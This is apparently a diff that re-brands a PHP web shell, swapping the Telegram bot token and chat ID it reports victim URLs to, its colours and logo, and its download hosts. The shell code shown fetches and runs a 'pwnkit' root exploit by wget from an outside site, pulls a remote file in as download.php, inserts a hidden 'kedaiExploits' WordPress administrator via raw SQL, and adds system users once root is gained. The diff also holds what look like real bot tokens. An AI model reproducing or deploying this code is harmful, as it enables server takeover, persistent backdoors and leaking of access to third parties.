@@ -1,7 +1,7 @@
 <?php
 // Token bot dan chat ID
-$botToken = "7322478770:AAFCoP-jCy1cJ2DCqv45rkwt9toJYBPEITA"; // Ganti dengan token bot Anda
-$chatID = "-1002348135957"; // Ganti dengan chat ID grup Anda
+$botToken = "7911520220:AAGJviCgniZ6_GUe9tPz9gQ0uKkpT2b64fI"; // Ganti dengan token bot Anda
+$chatID = ""; // Ganti dengan chat ID grup Anda
 
 // Data yang akan dikirim
 $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; // URL akses
@@ -255,7 +255,7 @@ if ($_GET['don'] == true) {
         .btn-submit,
         .form-file,
         tbody tr:nth-child(2n) {
-            background-color: #111740
+            background-color: #25688f
         }
 
         .code-editor,
@@ -292,7 +292,7 @@ if ($_GET['don'] == true) {
         .menu-file-manager ul,
         .path-pwd,
         thead {
-            background-color: #111740
+            background-color: #25688f
         }
 
         ul {
@@ -389,7 +389,7 @@ if ($_GET['don'] == true) {
         }
 
         ::-webkit-scrollbar-thumb {
-            background: #111740;
+            background: #25688f;
             border: 2px solid #555;
             border-radius: 4px
         }
@@ -456,7 +456,7 @@ if ($_GET['don'] == true) {
         }
 
         .btn-modal-close {
-            background-color: #111740;
+            background-color: #25688f;
             color: #fff;
             border: none;
             border-radius: 4px;
@@ -469,7 +469,7 @@ if ($_GET['don'] == true) {
             padding: 5px;
             border-radius: 5px;
             margin-left: 110px;
-            background-color: #111740
+            background-color: #25688f
         }
 
         .modal-btn-form {
@@ -581,7 +581,7 @@ if ($_GET['don'] == true) {
         .bc-gecko,
         .mail,
         .terminal-input {
-            background-color: #111740;
+            background-color: #25688f;
             color: #fff
         }
 
@@ -602,7 +602,7 @@ if ($_GET['don'] == true) {
 
         .terminal-body textarea {
             margin: 4px;
-            background-color: #111740;
+            background-color: #25688f;
             color: #29db12;
             border-radius: 4px
         }
@@ -614,7 +614,7 @@ if ($_GET['don'] == true) {
         .terminal-input {
             width: 500px;
             padding: 6px;
-            border: 1px solid #111740;
+            border: 1px solid #25688f;
             border-radius: 4px;
             margin: 5px 0
         }
@@ -651,7 +651,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-solid fa-globe">DISABLED :</i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php">PHP VERSION :</i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user">USER :</i>&nbsp;<?= $fungsi[9](); ?></li>
-            <li class="logo-gecko"><img width="400" height="400" src="https://i.imgur.com/6qpyCQS.png" align="right"></li>
+            <li class="logo-gecko"><img width="400" height="400" src="https://i.imgur.com/cYevGR3.png" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
             </form>
@@ -681,7 +681,7 @@ if ($_GET['don'] == true) {
 <?php
 function download_file() {
     // URL sumber file
-    $url = "https://raw.githubusercontent.com/nerogativgit13/Toolsnerx13/refs/heads/main/bar.css";
+    $url = "http://avatarbiru.site/source/tebar.css";
 
     // Lokasi penyimpanan file unduhan di server
     $download_path = __DIR__ . "/download.php";
@@ -996,8 +996,8 @@ if (isset($_GET['logout'])) {
                     </ul>
                 </div>
                 <div class="terminal-body">
-                    <textarea name="" disabled><?php if ($fungsi[3]('.eclips') && $fungsi[3]('pwnkit')) {
-                                                    $response = $fungsi[11]('.eclips');
+                    <textarea name="" disabled><?php if ($fungsi[3]('.kedai') && $fungsi[3]('pwnkit')) {
+                                                    $response = $fungsi[11]('.kedai');
                                                     $r_text = explode(" ", $response);
                                                     if ($r_text[0] == "uid=0(root)") {
                                                         if (isset($_POST['submit-root'])) {
@@ -1009,7 +1009,7 @@ if (isset($_GET['logout'])) {
                                                         echo "Kernel Version : " . suggest_exploit() . "\n";
                                                     }
                                                 } else {
-                                                    $fungsi[24]('.eclips');
+                                                    $fungsi[24]('.kedai');
                                                 } ?></textarea>
                     <form action="" method="post">
                         <ul>
@@ -1148,7 +1148,7 @@ if (isset($_POST['submitwp'])) {
         die("Error Cug : " . $conn->connect_error);
     }
 
-    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'eclipsExploits', '', '', NOW(), '', 0, 'eclipsExploits')";
+    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'kedaiExploits', '', '', NOW(), '', 0, 'kedaiExploits')";
 
     $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";
 
@@ -1310,9 +1310,9 @@ if (isset($_POST['save-editor'])) {
 
 if ($_GET['terminal'] == "root") {
     if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
-        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/nerogativgit13/Toolsnerx13/raw/refs/heads/main/limaempat"));
+        $fungsi[28]("pwnkit", $fungsi[11]("https://kedaipapa.site/rootkit/limaempat"));
         cmd('chmod +x pwnkit');
-        echo cmd('./pwnkit "id" > .eclips');
+        echo cmd('./pwnkit "id" > .kedai');
         echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
     }
 }
@@ -1401,12 +1401,12 @@ if (isset($_POST['submit'])) {
         }
     } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
         if (!$fungsi[3]('pwnkit')) {
-            cmd('wget https://eclipspapa.site/rootkit/limaempat -O pwnkit');
+            cmd('wget https://kedaipapa.site/rootkit/limaempat -O pwnkit');
             cmd('chmod +x pwnkit');
-            cmd('./pwnkit "id" > .eclips');
+            cmd('./pwnkit "id" > .kedai');
             echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
-        } else if ($fungsi[3]('.eclips')) {
-            $response = $fungsi[11]('.eclips');
+        } else if ($fungsi[3]('.kedai')) {
+            $response = $fungsi[11]('.kedai');
             $r_text = explode(" ", $response);
             if ($r_text[0] == "uid=0(root)") {
                 $username = $_POST['add-username'];
@@ -1493,7 +1493,7 @@ Swal.fire({
     icon: 'success',
     title: 'Sucesss...',
     text: 'Done Success!',
-    confirmButtonColor: '#111740',
+    confirmButtonColor: '#25688f',
 })</script>";
 } else if ($_GET['response'] == "failed") {
     echo "<script>
@@ -1501,7 +1501,7 @@ Swal.fire({
     icon: 'error',
     title: 'Failed...',
     text: 'Something wrong!',
-    confirmButtonColor: '#111740',
+    confirmButtonColor: '#25688f',
 })
     </script>";
 }
